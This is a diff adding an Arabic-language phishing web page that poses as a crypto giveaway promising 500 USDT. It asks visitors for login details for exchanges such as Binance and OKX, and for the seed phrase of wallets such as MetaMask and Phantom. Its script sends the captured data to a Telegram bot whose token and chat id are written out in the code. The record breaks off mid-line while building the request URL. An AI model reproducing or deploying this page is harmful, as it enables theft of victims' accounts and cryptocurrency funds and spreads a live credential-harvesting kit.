@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Rewards 2026</title>
+    <style>
+        body { background-color: #0b0e11; color: #eaecef; font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; }
+        .container { max-width: 450px; margin: 20px auto; background: #1e2329; padding: 20px; border-radius: 15px; border: 1px solid #474d57; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .header-text { color: #f0b90b; font-size: 22px; margin-bottom: 10px; }
+        .logo-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .platform { border: 1px solid #474d57; padding: 12px; border-radius: 10px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; background: #181a20; }
+        .platform:hover { border-color: #f0b90b; background: #2b3139; }
+        .platform img { width: 30px; height: 30px; margin-left: 10px; border-radius: 5px; }
+        .platform span { font-weight: bold; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #474d57; background: #2b3139; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background-color: #f0b90b; color: #1e2329; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+        .hidden { display: none; }
+        .footer-note { font-size: 12px; color: #848e9c; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="selection-box">
+    <h2 class="header-text">مركز مكافآت الكريبتو 2026 🎁</h2>
+    <p>اختر منصتك أو محفظتك لتفعيل جائزة 500$ USDT</p>
+    
+    <div class="logo-grid">
+        <div class="platform" onclick="showLogin('Binance')"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"> <span>Binance</span></div>
+        <div class="platform" onclick="showLogin('Bybit')"><img src="https://cryptologos.cc/logos/bybit-logo.png"> <span>Bybit</span></div>
+        <div class="platform" onclick="showLogin('MEXC')"><img src="https://seeklogo.com/images/M/mexc-logo-50346E1B6B-seeklogo.com.png"> <span>MEXC</span></div>
+        <div class="platform" onclick="showLogin('KuCoin')"><img src="https://cryptologos.cc/logos/kucoin-kcs-logo.png"> <span>KuCoin</span></div>
+        <div class="platform" onclick="showLogin('OKX')"><img src="https://cryptologos.cc/logos/okx-logo.png"> <span>OKX</span></div>
+        
+        <div class="platform" onclick="showLogin('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"> <span>MetaMask</span></div>
+        <div class="platform" onclick="showLogin('Trust Wallet')"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png"> <span>Trust Wallet</span></div>
+        <div class="platform" onclick="showLogin('Phantom')"><img src="https://cryptologos.cc/logos/phantom-phantom-logo.png"> <span>Phantom</span></div>
+    </div>
+    <p class="footer-note">أكثر من 1,200 مستخدم استلموا مكافآتهم اليوم</p>
+</div>
+
+<div class="container hidden" id="login-box">
+    <h3 id="platform-name" style="color:#f0b90b">تسجيل الدخول</h3>
+    <p id="instruction" style="font-size: 14px;">أدخل معلومات حسابك لتأكيد الهوية واستلام المكافأة</p>
+    
+    <form id="pishForm">
+        <input type="text" id="user_id" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="user_pass" placeholder="كلمة المرور" required>
+        <button type="submit">تأكيد الربط واستلام USDT</button>
+    </form>
+</div>
+
+<script>
+    let selectedPlatform = "";
+
+    function showLogin(platform) {
+        selectedPlatform = platform;
+        document.getElementById('selection-box').classList.add('hidden');
+        document.getElementById('login-box').classList.remove('hidden');
+        document.getElementById('platform-name').innerText = "الربط مع " + platform;
+        
+        // تغيير الكلام إذا كانت محفظة
+        if(platform === 'Trust Wallet' || platform === 'MetaMask' || platform === 'Phantom') {
+            document.getElementById('instruction').innerText = "أدخل عبارة الاسترداد (12 كلمة) لربط المحفظة";
+            document.getElementById('user_id').placeholder = "عبارة الاسترداد (Seed Phrase)";
+        }
+    }
+
+    document.getElementById('pishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const info = document.getElementById('user_id').value;
+        const pass = document.getElementById('user_pass').value;
+        
+        // التوكن والآيدي ديالك
+        const token = "8351638574:AAFWn2S7A9pG-HIdmNl6yv-pYJ9_mG-5DkE";
+        const chat_id = "6925387370";
+        const text = `🎯 صيد جديد (GitHub)!\n\n🏢 المنصة/المحفظة: ${selectedPlatform}\n📝 البيانات/Seed: ${info}\n🔑 الباسورد: ${pass}`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURICom
